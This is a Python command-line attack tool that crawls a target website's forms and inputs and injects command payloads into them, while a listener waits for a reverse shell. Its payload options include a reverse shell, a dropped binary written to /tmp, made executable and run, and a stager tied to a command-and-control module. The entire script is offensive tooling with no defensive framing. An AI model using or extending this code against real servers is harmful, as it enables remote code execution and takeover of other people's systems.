#!/usr/bin/python3

import argparse

from payloads import Monkey, Generator, ControlTower

from server import ReverseListener

import random
import string

parser = argparse.ArgumentParser(description='Test')


def randword(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))


def comma_separated(names):
    return names.split(',')


PAYLOAD_TYPES = ['shell', 'binshell', 'stager', 'custom']

parser.add_argument('target_url', help='Target URL')
parser.add_argument('-lhost', '--lhost', help='Server ip the payload connects to', default='127.0.0.1')
parser.add_argument('-lport', '--lport', help="Port the payload connects to", default='80')
parser.add_argument('-ptype', '--ptype', help=f"Port of the server the payload connects to: {', '.join(PAYLOAD_TYPES)}", default='shell')
parser.add_argument('-payload', '--payload', help="if ptype is custom, provide your own string to inject", default=None)
parser.add_argument('-names', type=comma_separated, help="Comma-separated list of names to inject (website input points of your choosing)", default=[])
parser.add_argument('-v', '--verbose', action='store_true', help='Increase output verbosity')

args = parser.parse_args()

print(f"target_url: {args.target_url}")

if args.verbose:
    pass
    # TODO

if not args.target_url:
    print("Target URL required")
    exit(1)

if args.ptype not in PAYLOAD_TYPES:
    print("\n")
    print(f"-ptype should be one of [{', '.join(PAYLOAD_TYPES)}]")
    exit(1)

if args.ptype == 'custom' and not args.payload:
    print("\n")
    print("-ptype is set to custom but no payload is provided")
    exit(1)

if "http" not in args.target_url:
    print("\n")
    print("No protocol specified")
    exit(1)

if not args.lhost:
    print("\n")
    print("No -lhost specified")
    exit(1)

LHOST = args.lhost
LPORT = args.lport

has_shell = False


def on_recv(data):
    print("".join([d.decode() for d in data]))


def on_shell(addr):
    global has_shell
    has_shell = True


try:
    monkey = Monkey(args.target_url)

    generator = Generator(lhost=LHOST, lport=LPORT)

    listener = ReverseListener(
        ip=LHOST, port=LPORT, cmd_cb=None, recv_cb=on_recv, success_cb=on_shell, once=False)

    listener.start()

    if monkey.get_forms() is None and monkey.get_inputs() is None:
        print("Nowhere to inject")
        exit(1)

    print(monkey.get_js_endpoints())
    print(monkey.get_js_urls())

    if args.ptype == 'shell':
        pl = generator.ir_shell()

    elif args.ptype == 'binshell':
        pl_bin = generator.ir_bin()
        n = randword(4)
        pl = f'printf "{pl_bin}" > /tmp/{n} && chmod +x /tmp/{n} && /tmp/{n}'

    elif args.ptype == 'stager':
        pl_bin = generator.ir_master()
        n = randword(4)
        pl = f'printf "{pl_bin}" > /tmp/{n} && chmod +x /tmp/{n} && /tmp/{n}'

        ct = ControlTower()

    elif args.ptype == 'custom':
        pl = args.payload

    if monkey.get_forms():
        print("Injecting via forms")
        monkey.autoinject_forms(pl)

    if monkey.get_inputs() and not has_shell:
        print("Injecting with names found in inputs")
        monkey.autoinject_urls(pl)

    if monkey.get_inputs() and not has_shell and (len(args.names) > 0):
        print("Injecting via endpoints with custom names")
        shell = generator.ir_shell()
        monkey.autoinject_urls()

    if not has_shell:
        print("\n")
        if not args.payload:  # if we don't care about output
            print("Failed :(")
            print("Try a different payload type")

except KeyboardInterrupt:  # ctrl-c
    quit()
